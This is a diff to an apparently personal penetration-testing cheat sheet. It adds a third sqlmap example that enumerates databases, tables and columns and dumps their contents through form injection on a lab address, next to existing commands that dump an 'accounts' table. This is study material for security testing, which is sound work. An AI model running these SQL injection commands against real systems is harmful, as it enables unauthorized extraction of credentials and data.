@@ -86,8 +86,35 @@ If we needed authentication to access to the web we will need to add the cookies
 		sqlmap -r pc -p id --dbs 
 		sqlmap -r pc -p id --tables  
 		sqlmap -r pc -p id -D SQLite_masterdb -T accounts --columns 
-		sqlmap -r pc -p id -D SQLite_masterdb -T accounts --batch --threads 5 --dump```
+		sqlmap -r pc -p id -D SQLite_masterdb -T accounts --batch --threads 5 --dump
+		```
+- **Exemple 3**
+	- As in the first example we can use *sqlmap* with an specified target to extract the database information withput using cookies:
+	- *Parameters*:
+		- `-u`: Specifies the target URL to be tested for SQL injection vulnerabilities. In this case, the target URL is `http://192.168.1.102/administrator`
+	    
+		- `--batch`: This parameter is used to run sqlmap in batch mode, which means it will not prompt for any interactive user input and will perform the operations automatically.
+	    
+		- `--dbs`: This parameter instructs sqlmap to enumerate the available databases on the database server. By specifying this parameter, sqlmap will search for information about the databases it has access to by injecting SQL into the mentioned parameter.
 
+		- `--tables`: This parameter instructs sqlmap to enumerate the available tables in the selected database. By using this parameter, sqlmap will search for information about the tables present in the database through the injection of SQL into the mentioned parameter.
+	```bash
+	sqlmap -u http://192.168.1.102/administrator --forms --dbs --batch
+	```
+	After using this command the available databases will be printed, then you can enumerate  the tales stored in each database:
+	```bash
+	sqlmap -u http://192.168.1.102/administrator --forms -D <database_name> --tables --batch
+	```
+	Once you have introduced this command the available columns in the database will be printed. Now to find the content of the columns you need to use the following command:
+	```bash
+	sqlmap -u http://192.168.1.102/administrator --forms -D <database_name> -T <Columns_name> --columns --batch
+	```
+	Finally, you can print the columns information using:
+	```bash
+	sqlmap -u http://192.168.1.102/administrator --forms -D <database_name> -T <Columns_name> -C <parameter1>,<parameter2><parameter3> --dump --batch
+	```
+
+ 
 
 # MySQL <a name="mysql"></a>
 
